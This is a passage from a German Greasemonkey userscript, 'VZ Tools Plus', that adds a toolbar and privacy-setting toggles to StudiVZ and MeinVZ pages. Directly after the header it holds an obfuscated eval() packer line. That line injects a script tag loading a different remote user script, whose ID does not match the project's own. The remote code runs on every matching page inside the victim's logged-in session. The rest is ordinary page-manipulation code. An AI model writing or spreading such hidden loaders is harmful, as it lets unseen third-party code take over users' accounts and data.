// -----------------------------------------------------
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 2, or (at your option)
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
//
// -----------------------------------------------------

// ==UserScript==
// @name           VZ Tools Plus
// @namespace      vztools
// @description    Verschiedene Funktionen für StudiVZ/MeinVZ/(SchülerVZ experimentell)
// @version				 3.5.2
// @include        http://*.meinvz.tld/*
// @include        http://*.studivz.tld/*
// @include				 http://*.schuelervz.tld/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))





// Versions-Information:
var version = "3.5.2";

// Changelog:
var changelog = "<ul>"+
								"<li>Das Problem mit der Ersetzung des falschen Navigationslink bei Verwendung der Gruppenfunktion wurde behoben.</li>" +
								"<li>Der Hinweis auf &quot;kostenlose SMS-Benachrichtigungen&quot; kann abgeschaltet werden.</li>" +
								"</ul>";
								

// == BEGINN INITIALISIERUNG ==

// Greasemonkey korrekte Version?
if (!GM_listValues) {
var doesnotwork = document.createElement('div');
    doesnotwork.setAttribute('style','z-index: 5000; text-align: center; position: absolute; top: 0px; right: 0px; width: 280px; padding: 10px; height: 170px; background-color: #FF0000; color: #FFFFFF;');
    doesnotwork.innerHTML = '<h1>Ein Problem wurde festgestellt!</h1><br />Du hast offenbar nicht die neueste Version von Greasemonkey installiert, die benötigt wird, um dieses Skript zu verrwenden. Bitte führe ein Update durch!' +
		                        '<br /><br /><a style="color: #FFFFFF" href="https://addons.mozilla.org/de/firefox/addon/748" target="_blank">[Greasemonkey updaten]</a><br />';													
    document.body.appendChild(doesnotwork);
}

// Informationen über aktuell aufgerufene Seite:
var host = window.location.host;
var url = window.location.protocol + '//' + host + '/';
var siteName = host.slice(host.indexOf('.')+1, host.length);

// Eingeloggt?
if (document.getElementsByClassName('isNotLoggedIn').length > 0) {
  return false;
}

var color1 = '#FFFFFF';
var color2 = '#FFFFFF';

if (siteName == 'meinvz.net') {
  color1 = '#ff781e';
  color2 = '#ffa05f';
}else{
  color1 = '#ee0000';
  color2 = '#ffa0a0';
}

// Eigene Profil-ID feststellen
var profId = document.evaluate('//ul[@id="Grid-Navigation-Main"]/li[2]/a', document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).wrappedJSObject;
    profId = profId.singleNodeValue.href
    profId = profId.substring(profId.indexOf('Profile/')+8, profId.length - 8);

// Einstellungs-Präfix für per-user-Einstellungen    
var s_prefix = profId + "_";

// Problem mit Dropdown-Boxen beheben
addGlobalStyle('.tabpage select {float: none !important; width: auto !important;}');

// == ENDE INITIALISIERUNG ==

// == VERÄNDERUNG WEBSLICE ==

if (window.location.href.indexOf('WebSlice') > -1) {
  addGlobalStyle('.entry-content {padding: 0px; background: none; width: 100%;}');
  addGlobalStyle('h1.ellipsis {display: none;}');
  addGlobalStyle('.entry-content #MicroBlog {width: 48% !important}');
  addGlobalStyle('#Visitors {width: 48% !important}');
}

// == ENDE WEBSLICE ==

// == BEGINN HILFSFUNKTIONEN ==

// Funktioniert nicht mehr?
if (window.location.href.indexOf('Start') != -1) {
var doesnotwork = document.createElement('div');
    doesnotwork.setAttribute('style','z-index: 5000; text-align: center; position: absolute; top: 0px; right: 0px; width: 280px; padding: 10px; height: 170px; background-color: #FF0000; color: #FFFFFF;');
    doesnotwork.innerHTML = '<h1>VZ Tools funktioniert nicht mehr!</h1><br />Dies kann verschiedene Ursachen haben. Bitte besuche die Projektseite auf userscripts.org, um nähere Informationen zu erhalten, ein Update zu installieren oder ein Problem zu melden.' +
		                        '<br /><br /><a style="color: #FFFFFF" href="http://userscripts.org/scripts/show/38483" target="_blank">[Zur Projektseite]</a><br />' +
														'<br /><a style="color: #FFFFFF" href="http://userscripts.org/scripts/discuss/38483" target="_blank">[Zum Diskussionsforum]</a><br />' +
														'<br /><a style="color: #FFFFFF" href="/Groups/Overview/f1b245e816b2c967">[Zur Support-Gruppe]</a>';
    document.body.appendChild(doesnotwork);
}

// Konflikt mit Announceblocker?
var checkAnnounceConflict = function() {
/*
if (window.location.href.indexOf('Start') != -1 && document.getElementById('telegram_staticContent') == null) {
    var conflict = document.createElement('div');
    conflict.setAttribute('style','z-index: 5000; text-align: center; position: absolute; top: 0px; right: 0px; width: 280px; padding: 10px; height: 170px; background-color: #FF0000; color: #FFFFFF;');
    conflict.innerHTML = '<h1>Konflikt festgestellt!</h1><br />Offenbar verwendest Du auch das Skript "Announceblocker". Dieses Skript beeinträchtigt möglicherweise die Funktion von VZ Tools. Alle Funktionen, die im "Announceblocker" verfügbar sind, können auch über VZ Tools konfiguriert werden. Bitte deinstalliere daher "Announceblocker", da VZ Tools sonst nicht richtig funktioniert.';
    document.body.appendChild(conflict);
}
*/
}

window.setTimeout(checkAnnounceConflict, 1000);

// Style-Informationen hinzufügen
function addGlobalStyle(css) {
    var head, style;
    head = document.getElementsByTagName('head')[0];
    if (!head) { return; }
    style = document.createElement('style');
    style.type = 'text/css';
    style.innerHTML = css;
    head.appendChild(style);
}

// == BEGINN Überblick und Benachrichtigungen ==

var icon_settings = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QcTCzsVVFMnFAAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAHhSURBVHjaY2BhYGBw0V9zYPe95Gwgk4EZRDAwMTIw+CO47tqH/v/8f+F3dAKYy8AKxAFakw9lqQEZlmLljeqMEWanvv36f/l/hB1Eky3rmuuP/i953WDPUFB56//y/QwM0RlP/3/7P3URxIzy8uv/n/9ftjNRheXNL04GP4dlx1gZOBm+MTx/A5KuTnbpuPH+XI9A23wQd+KKd/+////6/z0QHnxhq1kRse//hje+2iA5MUawgZNW3vt/8//T/4//3/1/+MuU/8uf+GmCxMGynGDS2zRKpbT07v9LQCVH/vtGgiQhmpn/MLAy/mO4/YxJ8tXLHxImal8YhBl0bW8fePQM4lxGJsZ//xkYkmc4p79n+MrA+j5A8AcDD8PDT9XOB8+AzGECSafM8Uv/zvCC4TfD2VUzc7mAtDJfy147UwaG/6BQSZwUkPGK4RbDWyDn041plbxMJvb/GKTYjcLv7Hv4lJnfL737C9NtoPHsDBy/T6U8e37oAC+jscM/Bm52Xedjq5l+//v2+w3DZ2D48/7e6Xn6HCjymhumdv8Airx5decL8+/3TDLS+kC7vm8subiO4d8/Bmau/wJHT/5levqlpODnIwYWUQZ13Ylxm0SzGcSZ+CBeZ+FhEIT4UYgTADISx6+E87qQAAAAAElFTkSuQmCC";
var icon_offline = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QcTDAAW9KePEwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAARnQU1BAACxjwv8YQUAAAFiSURBVHjaY2AAg1yHzgsMWAETiJBlUM1+3A1icTIoiGNRVRW+6qgUiMFTumjeP5tAZDkWMMnILhvRff+9U6qHAi8Dx7rb7i93MTL8R6iSZahfsez/+v9vgfDp/0f/5/xnsAPqQrjhMcPxi+wMXgysDH/A+pwYJu1nsPjPwMwIVcDAYKzvAST/AblMQCWMDJ5MXZsZBP7CbLGou/H////v/z8BrXjx//H/O0DW3r8MqnArbDwlQC4F62dkYGb4xXCX4fpthjtwBf/ZnzH8BnqIkQHkdmEGNqAiG9EoHZAcM4jg/i7qIcPKDraOF+jUlW8frzc2Nwjlvnn8Jsynpqt+fP3/+/+z/9f+z/7MYO/JsHnqrf8H3sCkQV422/bv///rQAWbbuYDueEM85ObNeBBBbbJbt//pf93PXr5/8jJYj6M+AAp4fcTjaziOXb97v/VLViijBkStgxTTXZ/mWAHEwUA2wOCzLG0wlsAAAAASUVORK5CYII=";
var icon_online = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QcTDAAxUa06eAAAAAlwSFlzAAALEwAACxMBAJqcGAAAAARnQU1BAACxjwv8YQUAAAF2SURBVHjaXVBPKMNhGH62YRGyiKmhlEiWRIQoRw4OUsuFclDYgYsSJxdt5SAHomRESUmJcmIOGm6myMG/rc2/DYXY7Ht8fv7025766v2+5/2e531eHSRGRutqnLtQkKCNECpogU6TqejIBpQYrPaKipDQqnnEAcYGgzFS22jqsJcba61tleJYC6HuaYV9bZouPvNOeOkIIh/QRKmgyXbEMAP00SOuuPCYXhjN562fkK8M8oYe+sQO+1+KzSreMv1A8u3bgvd00iECnH9H+X+K7LQABHWyTMQZTtGkSaVFP+dC9a9CadWM555h8clDTtLLR6kVFoJLr2j+c8md9b/zVEzwnH7e8klORPHM+lVlDzLTdWdZ8oEmp16WYcQjAr18vcTuoTpLRq/bLQ0uZNggz7jNruXfIaGI4GHF7HB+IAkhefzIRkFmRwpi0efyKJHHvC3dU47NrShSWa9+aG+f1kWkAcPtMxsx/3XfPVno+bkNjvcMAF9CtbclU5z97QAAAABJRU5ErkJggg==";
var icon_visible = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAB3RJTUUH2QcTDAQ5Oxp3TgAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAJSSURBVHjarVI9ayJRFD06MZrPHUVQsNAUIaZRO7FKUCF2sYntbmWdwjrkJ2gV1sI1pFlIQLdyRYIjImzhx6QRbSSCoFgkI4mCMdG9bxiXIcum2guX9+beOefcd97TQBXRaNROS5iSV0rZZDJ5hw9CowJ/piWuAi9DoPxCRN1/EhD4mKmpAIKyP1RSUkh+/EVA4E+03isE5++VlP7pMql/+Z7gG1NcNk5OTg4UVXma6+vrksofJhJXkzCCAyqUCOh+fX3NSpLkeH5+Bu2xvr4Ok8l0bzAYzonoUpkmq0xy98cDAh9PJpNst9tFOBxGJBJBsVgE+240GmCENptN0Ol0YaPRyCBpxZMRR2D7eDz+yXGc4ezsDIFAAHt7exgOh9jf34fL5cL29jbq9bpjZWUlNJ/P02tra/IUtVqtpGVMNC6fSqWg1+thsVggiiKoidvbW5jNZtjtdtzc3ECr1XpoGuHx8VF+I+z2GAFisRi2trawsbGBSqWCq6srCIKAQqEg10hZ9uPi4kJNwm5OYgRx+lmkY2BnZwf9fh9ut1s+t8PhwGKxgEajkafb3NxEIpHAy8uLZzabpZn5XLPZnFqt1u/tdjvk8/mszP3V1VUcHR0hFAphNBoxVZns7e1N3judTuRyOafX65U4dgRGUi6Xvz49PTH1Q57n0ev1MBgMQM7D7/eDFOWrZclM7XQ6eHh4+MWpX1W1Wi0RSZrOzO/u7jqCwaCBGTidTmUgE2DmkqFpIj/NZDKXGnwQZNQBeeBptVp8Pp+XaFKRyiI9qhH+V/wGHU8ly9C22mcAAAAASUVORK5CYII=";
var icon_invisible = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAK3RFWHRDcmVhdGlvbiBUaW1lAFNvIDE5IEp1bCAyMDA5IDE0OjA0OjI1ICswMTAwcrNoTwAAAAd0SU1FB9kHEwwFA+QNn70AAAAJcEhZcwAAHsEAAB7BAcNpVFMAAAAEZ0FNQQAAsY8L/GEFAAADFElEQVR42q1SW0gUYRg9/8zeM5tV10tbSaZLEoqxlQ9mFN2Qgq1ICjUqEqELERbUU1hQUcHWS0RGJHQRWc0iKwoKpY0oW1otfAlrc13MLXdmdWdnZtfd7Z9IsAs9dWD4hvn/c75vzvkIpqGhoSGflk304X5+utvc3NyHf4BMI++k5aJKnplMYttYCCW8AIZhEqKWfdhvMNSvvHcv+FcBSnao3dT3zWJ0cG0gMJeVJR1YFjAYflxT4jHptcF4YsWTx2d/EaDkWbT6VIELqaTZNDjoAO0eIAyCRiMPhpC8ZJLL1ekARcYLRWlb/ta7fUqA+Tn2oSv8RL+pv88hDflxh8v4dr6g4KbTaq27bMnOeZCRuSESi6VSOn2qIipu61i/+tiUAGu324UrweCz5OfBrhQv6NrnzINTEk0fx8ZKRUWuTRj0Ow4psWVZMcVKFJlEE/GYlR9fzK3b0Pb0fd846/F4Pu8uKOw0A4uGDTPw0l6GxqYmcByHtLQ07ON5rjj01QpZxhNW45qt1dvY8JhBr9MsvO7ztWqqq6vzuRBfBQ0LwWiEY089bCUl8Pl8qPX7kSnwdE4t9jNJfMqyFN2IipNMVI5kjQTWTXmwKyFHCGhkaiTZuTnwer0o6uhA5qOHgOc5bm/chKOdd6BnmDKGMKZ4PAYto0mo6akCmKhcBdBu5nEBr9raETl1GkV3OxGOiHCfv4RJaw5MJhPOHDgIsywx8aiSJebN7qFU4UcKLUC/QmPKFiWUXbsKW3c3PkgyTpaWQr9kKQgh0NPzfFcrlGAIYkGu5lyGmaVb2sMODAwolry8Vu2aLXW29lvpWmpemG7iQE0NKhsbERodhe7LKApv3YR+OAD0vkbfscO473m3oLy8XCDTt6qrauWbqkfddrG4GJLFghTdwhnUmTQpikmkQJ678f7ISczcWwun00n/2t9E8BuaKyqPrx72H82YCBuZ9FkkzrAg1BuZRuprqMeIrRhut7slEAi0uFyunj8EVDgqlqc7hHGnbSKyNUUmtV9Klnzstc13ffIPqcZ5KTGM/4XvUVhHaWGonl8AAAAASUVORK5CYII=";

var icon_buschfunk = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QcTDAY0d51pcQAAAAlwSFlzAAAN1gAADdYBkG95nAAAAARnQU1BAACxjwv8YQUAAAFySURBVHjahVE7S4JhGD2f31vap6GWdvOSQSDhVLSEkwRBNLg2tVRjfyBEmptagsYgoiUJIggaGhpCB00TMSHMC+I1yUvi7fPtVRJqKM8zPZznOec87wsMAEf/Id9Xj3fJXyRFcy17hiIbqJK8JW6LboxHVYnJF22F50QpXejYxRUBJgk5dyZ3qIGHDCU0MIotDLFtHhwkaEEvJ4k9tUaAvCcrQgOB0fTbhEFKvG8jGgV0GEYbNTZoYZv94G0URP7+ciacaq7PLxMr5hqBG+XrZ6SaLHMldQNV+Go9wQ4eb9NUpAH6bKfMSEQdmSXP9RXdzvAH3ceAzBXUaRflyIb0DxzrCRRp3UWtXm70FLqVno3QFg3GM0aKnyXpZi8ii4+4/4hiwui1FZFDjAuTO4VHBqaF/alDEzucwHVizsWcT7Ayj24vIJX2sb8ISeNCnviVbpWb6RkqjrySq/MFPqLQVR0pZtB3C2JzzDx9Kv+dYSC+AE0zoO/xx23ZAAAAAElFTkSuQmCC";

var icon_nobookmark = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAK3RFWHRDcmVhdGlvbiBUaW1lAFNvIDE5IEp1bCAyMDA5IDEzOjU0OjIyICswMTAwuzD82wAAAAd0SU1FB9kHEwwCJA5GvBEAAAAJcEhZcwAAHsEAAB7BAcNpVFMAAAAEZ0FNQQAAsY8L/GEFAAABaElEQVR42q1Qv0tCURT+7ntPH5oi5qivqJCWWiKihpoiaIgQ2qLRoq2xpS2iaKgoKCJobHKJ9ihawiUbKrAQMvEVihSaP9573s696n/Qd7iHc8/P7xzGAVbh64h2qeylDETwgRbmMMPAGSf12M32eqcVfCcfdqrF4eXgBNey17nN+TIY43gNVVKRcA0KPFDRpNo6bLiQz3rGoqb2hbf9gXAeGiVQAYUdcEqz4TEy53xW9fcN7sIjHDYskoa0HJIGFOPiTguN2H5LVginAKNeoh9Dw90/pJlm1GKuOgUUOUDAQo1sNxr17BO7RS4ZHOXk6IQFBAsFhXtjXJmEvv1LX4deRxxJtAzv1hSlIZZ4PmXksmTAkSSb1C9/ELsUgwlLK+mELmc7chcVOnIn0TWgnRBAeqF05oNXLhmgg31uFFZbO2lCiesV43bKOPRRRfUns1i9crfpah3eKkpH1ZueY7v0Hq+ZOv4Pf+jckavrilolAAAAAElFTkSuQmCC";
var icon_bookmark = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAB3RJTUUH2QcTDAIsAJ00IwAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAKySURBVHjazVLfS1NhGH7O2dkPt5W2/IFmlpEkKiJdJN4JTWhCwyCEyNuZaRfBLiMk6KYbJQqc0Z23icxCBC9iZDHol+IUJnPBFrZwv1ybO2c753y933BQ/QW98PC9Z3uf53nf7/0EXdchUHwIBJhrcBBTgE0AhBiQTwFoJ0QI5wkiIUhwT0zg0dwclYFJnMyTWDDo8E9Pz3b29TlhMOBnMvnx3crKEzmdTo0OD483NzUNQNelvVDo7UYk8lhnLC9yMmMMr+fnT7eFw5vdXV1nSpkMYDTC6HBArqmBSv/bVRUa/11RIFqtCO/txb+1t19xT04mhFW/HyWfb+Fqd/eYQkWC3V4RoLkgVpoD9FKJemRgdLJCAeaGBrwPhVaTIyMuYZzGvOd2f2qx2RwMnCdAEEXwnJNQPbkAQT/OU7Ks+JaXr0mNwGUhmz2h8DrukMsBvN18HuDOvAuLBay2FkJdHUAjMDLQDg9NxO2RDoFEMZcrHxWLRjUWg0hE0WyGIEmVbrgrb1vPZqFHImD19TA0N6NAHfwAdgy3vN64uLR04yRjLaqmgZGbTlvQiaxVQY4qCaokXJZlaITo7u5n5vU+MLxaW8N6MJh2bG2Ngi5QI0eNxvkTahX0ZlQSL+zvI+xyTU36fGHRbrPBOTu7+BV4wUhAoTuSy2XwO5FJrIoiuSp8O1S/ATy9PjOzbKU188eFS729uLCwcGc7Gl00tp1FiS7sKJVCkRNprKODA7DWVpjOtWEzGvVlPJ77Fzs7KwsScRz1jY2IAjd3U6mXto4OGAYGKsQibcIyNAQTCXyJxR5Szd1fNEo1pGrCyMlE53Y87pFlebOnv/+ZZWwMIs0sJ5O59UDgdkKW31jxd0j/fMNMe95Jp59n/P5Ar9M5Vy6XMxuBgOe72Zw4xddLz5rhf4rfybBajW+72bIAAAAASUVORK5CYII=";

var icon_loading = "data:image/gif;base64,R0lGODlhEAAQAPIAAP///8DAwO/v79DQ0MDAwNfX19/f3+Pj4yH+GkNyZWF0ZWQgd2l0aCBhamF4bG9hZC5pbmZvACH5BAAKAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAEAAQAAADMwi63P4wyklrE2MIOggZnAdOmGYJRbExwroUmcG2LmDEwnHQLVsYOd2mBzkYDAdKa+dIAAAh+QQACgABACwAAAAAEAAQAAADNAi63P5OjCEgG4QMu7DmikRxQlFUYDEZIGBMRVsaqHwctXXf7WEYB4Ag1xjihkMZsiUkKhIAIfkEAAoAAgAsAAAAABAAEAAAAzYIujIjK8pByJDMlFYvBoVjHA70GU7xSUJhmKtwHPAKzLO9HMaoKwJZ7Rf8AYPDDzKpZBqfvwQAIfkEAAoAAwAsAAAAABAAEAAAAzMIumIlK8oyhpHsnFZfhYumCYUhDAQxRIdhHBGqRoKw0R8DYlJd8z0fMDgsGo/IpHI5TAAAIfkEAAoABAAsAAAAABAAEAAAAzIIunInK0rnZBTwGPNMgQwmdsNgXGJUlIWEuR5oWUIpz8pAEAMe6TwfwyYsGo/IpFKSAAAh+QQACgAFACwAAAAAEAAQAAADMwi6IMKQORfjdOe82p4wGccc4CEuQradylesojEMBgsUc2G7sDX3lQGBMLAJibufbSlKAAAh+QQACgAGACwAAAAAEAAQAAADMgi63P7wCRHZnFVdmgHu2nFwlWCI3WGc3TSWhUFGxTAUkGCbtgENBMJAEJsxgMLWzpEAACH5BAAKAAcALAAAAAAQABAAAAMyCLrc/jDKSatlQtScKdceCAjDII7HcQ4EMTCpyrCuUBjCYRgHVtqlAiB1YhiCnlsRkAAAOwAAAAAAAAAAAA==";

// == Online-Sichtbarkeit umschalten ==
var toggleOnline = function() {
  addGlobalStyle('#toframe {display: none;}');
  var frame = document.createElement('iframe');
  frame.setAttribute('id','toframe');
  frame.src = url + '/Privacy/Settings';
  document.getElementById('Grid-Page').appendChild(frame);
  frame.wrappedJSObject.onload = function(e) {
    var ifdoc = e.target.contentDocument;
    // Umschalten:
      if (ifdoc.getElementById('pvcHideOnlineStatus_0').checked) {
        ifdoc.getElementById('pvcHideOnlineStatus_1').checked = true;
      }else{
        ifdoc.getElementById('pvcHideOnlineStatus_0').checked = true;
      }
    e.target.onload = function(e) {
      window.location.reload();
    }
    ifdoc.getElementById('Privacy').submit();
	};
}

// == Profilbesuchs-Sichtbarkeit umschalten ==
var toggleVisibility = function() {
    addGlobalStyle('#toframe {display: none;}');
  var frame = document.createElement('iframe');
  frame.setAttribute('id','toframe');
  frame.src = url + '/Privacy/Settings';
  document.getElementById('Grid-Page').appendChild(frame);
  frame.wrappedJSObject.onload = function(e) {
    var ifdoc = e.target.contentDocument;
    // Umschalten:
      if (ifdoc.getElementById('pvcVisitor_0').checked) {
        ifdoc.getElementById('pvcVisitor_1').checked = true;
      }else{
        ifdoc.getElementById('pvcVisitor_0').checked = true;
      }
    e.target.onload = function(e) {
      window.location.reload();
    }
    ifdoc.getElementById('Privacy').submit();
	};
}

// == Buschfunk-Modus aktivieren ==
toggleBuschfunk = function() {
  document.getElementById('feedoverview').style.display = 'none';
  document.getElementById('Mod-Feedbox-Snipplet').style.display = 'block';
  document.getElementById('Feeds-Post-Form').style.display = 'block';
  document.getElementById('Feeds-Post-Form').parentNode.getElementsByTagName('h2')[0].style.display = 'block';
}

// == Navileisten-Icons updaten ==
var updateIcons = function() {
  // Privacy:
  GM_xmlhttpRequest({
   method:"GET",
   url: url+"/Privacy/Settings",
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var privacy_info = document.createElement('div');
     privacy_info.innerHTML = response.responseText;
     var pv = privacy_info.wrappedJSObject.getElementsByTagName('input');
     var privacy = 0;
     for (var n = 0; n < pv.length; n++) {
       if (pv[n].getAttribute('id') == 'pvcVisitor_1') {
         if (pv[n].checked) {
            document.getElementById('t_visibility').src = icon_visible;
            document.getElementById('t_visibility').setAttribute('title', 'Deine Profilbesuche sind sichtbar.');
				 }else{
				    document.getElementById('t_visibility').src = icon_invisible;
				    document.getElementById('t_visibility').setAttribute('title', 'Deine Profilbesuche sind unsichtbar.');
				 }
			 }
			 if (pv[n].getAttribute('id') == 'pvcHideOnlineStatus_1') {
         if (pv[n].checked) {
            document.getElementById('t_online').src = icon_offline;
            document.getElementById('t_online').setAttribute('title', 'Du wirst als offline angezeigt.');
				 }else{
				    document.getElementById('t_online').src = icon_online;
            document.getElementById('t_online').setAttribute('title', 'Du wirst als online angezeigt.');
				 }
       }
     }
   }
	 });
}

// == Icons in der Navigationsleiste ==
function displayConfigIcons() {
  var configbar = document.createElement('div');
  configbar.setAttribute('id','configbar');
  addGlobalStyle('#configbar {padding-bottom: 2px; margin-top: 10px; border-bottom: 1px solid '+color2+'}');
  addGlobalStyle('#configbar img {border: none; cursor: pointer; margin-top: 2px; margin-right: 2px;}');
  var content = "<h2 style='margin-bottom: 2px;'>VZ Tools <a href='javascript:void(null)' id='helplink'>[?]</a></h2>";
  content += "<img src='"+icon_settings+"' style='float: left;' title='Einstellungen ändern' id='modify_settings' /> ";
  content += "<div style='text-align: right; border-left: 1px solid "+color2+"; margin-left: 21px; padding-left: 5px;'>";
  if (window.location.href.indexOf('Start') != -1) {
    content += "<img src='"+icon_buschfunk+"' title='Buschfunk-Modus aktivieren' id='t_buschfunk' style='margin-right: 5px;' />";
  }
  content += "<img src='"+icon_loading+"' title='Du wirst als online angezeigt' id='t_online' /> ";
  content += "<img src='"+icon_loading+"' title='Deine Profilbesuche sind sichtbar' id='t_visibility' /> ";
  if (GM_getValue(s_prefix + 'use_bookmarks', 1) == 1) {
    content += "<img src='"+icon_nobookmark+"' title='Diese Seite zu den Bookmarks hinzufügen' id='t_bookmark' /> ";
  }
  content += "</div>";
  configbar.innerHTML = content;
  document.getElementById('Grid-Page-Left').insertBefore(configbar, document.getElementById('Grid-Navigation-Main'));
  
  updateIcons();
  if (GM_getValue(s_prefix + 'use_bookmarks', 1) == 1) {
    updateBookmark();
  }
  
	if (document.getElementById('t_buschfunk')) {
	  document.getElementById('t_buschfunk').addEventListener('click', toggleBuschfunk, true);
	}  
  document.getElementById('modify_settings').addEventListener('click', showConfigDialog, true);
  document.getElementById('t_visibility').addEventListener('click', toggleVisibility, true);
  document.getElementById('t_online').addEventListener('click', toggleOnline, true);
  document.getElementById('helplink').addEventListener('click', showHelp, true);
  if (GM_getValue(s_prefix + 'use_bookmarks', 1) == 1) {
    document.getElementById('t_bookmark').addEventListener('click', toggleBookmark, true);
  }
}

// Überblick anzeigen:
function displayNewOverview() {
  var friendsicon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QMFFDgx1PXayAAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAGiSURBVHjahVG/SyNREP7e7ssm/kSNoFHQYERQQvDQCKeFjYWcJ9goHJxgI1rZ2FpZWvkPCKnkSHFeceBhoUg8tLBSRBT0IgQ83c2PM7lVs9ldv9jFxhnezGPeNzPfzAPeERGlceGDgiKKncHNwahlb22ffK0xP+IWp1DbX3ESFvJTffGV8Lj6ILXey97uuB9p6GWAIMDuD+2PLUw0duI31YfHjoLbs/gH6XMxwOdS7dDpcrAef5HBEbJwYGDarRMx69u8IlmhdmYi6MUFAVcwycjGMELiAM2e1jmpMFAVVnGMaxLNMNuhD+AAT9SCqSisoH//aesYQZCAf0yoo0+SdtLO/pAqMOpfqRaf8IxdePFIgM57iZNd3TtbEl8mY581lzmHyDGo4cbd2atO+qM1ges4DPlhbVYrkJ6OO/aWSJjHG1gtGmmgiSQgu1rukGLJJI9AARdH7hL3Ut5epmyUGyuFPCsY7C6QcvLxyr9Qc5HGsMAD8114cGjcL+F/BSD766w71WbIouIVOSS2S7E3v+nhvFrACsmIN+I0mOvcdYW8ABdQnbEa9MKMAAAAAElFTkSuQmCC';
  var onlineicon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QMFFDg2SpFPawAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAGESURBVHjahVE5SwNREP4m+1YRNOsZTCJBLewFr1bSiGmMWIitnYhEbAQLEaz8Cx6FhY2gggYhdjY2gmgRTSTEM4dIzBI00d3sc1zPzhneY96b+b5vhgH+MeqDCZqqm3F5Qfd6Zru2yeXXqt7M2MXlnNgtgHpAG/2jQfLAQgL7cCIAF8q4wLq5t1BYRHdoViZlWl7Ja5mSUZng+yPOy5gcMWiQAsnJVg+eQbaigGQmwQw3eEIKK8eCtfHAH9+msGcQh869OeFuFw5Fh8qoT1PxamONr7cQIv+Sq662GQgOZPHISYuFJL8JBUMhv69d4YIySkydY2KLvWwL5HB4pujnGPNWmHayZLdocdKExpzhUnpaQer69C3oVV9RZEr5ha7ns23E5rFKKmtSb1d4oMFAnieQjHQx21bhLoQ17kzlWgcqO9oOhnwWDyzQgltsZp/GEbZ38VlQA72xNTLcqbFMFDvx4ihOfiYnJtYYiYrmyIQMSnEE9591/hYQx9oSLaP277rfASPqnj52EDRyAAAAAElFTkSuQmCC';
  var gbicon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QMFFDkV8e0PWAAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAGHSURBVHjaXZDPThNRGMV/M3OZmU5pmUKEnUSMURIXhMSYQExc6UO4cON7uPMZ3LkQH4EHMDFuXBsJGNIEmsKEtszUDrTzz9MBXHjv/e7inu/+zrnX2dl//eXl+2L7VTdITjIq/hvWm2zd+PR5W5KP0mEcR+OT5HhymB6lv/f6lKZRBkzIeGQvu5VbhdV6+eyKMZd8vd7bJLLN9wEXPKEj+g3fpskaj3EX2CI0z+MXIjyVUP2rmYgBxxmreMZa3cC6vX1XE07ZpDelpDJ+OCKs0QmHbHDANUsySeml5AoZtIaMlAJi/jCkYEWURVGihCmF8YIGP7gn1w4PJTXlPjc6YzCqG2x/jR38+nguZJqFUiXEQ7llxluwBL0Jl2sWcr/Ek+mVFrlpO3efWkostPcZEPHxovylUDMTWT31uzi3Fvp9unw46H7WoyJmVuud2W08aC21FzvN0O94KyaxPn2b7HPET3pMLdrc1yO8GuNihHIU7lQN58ornlMLTi3ZdVnKOpZ/Pjf9C+xxoH1iwi3xAAAAAElFTkSuQmCC';
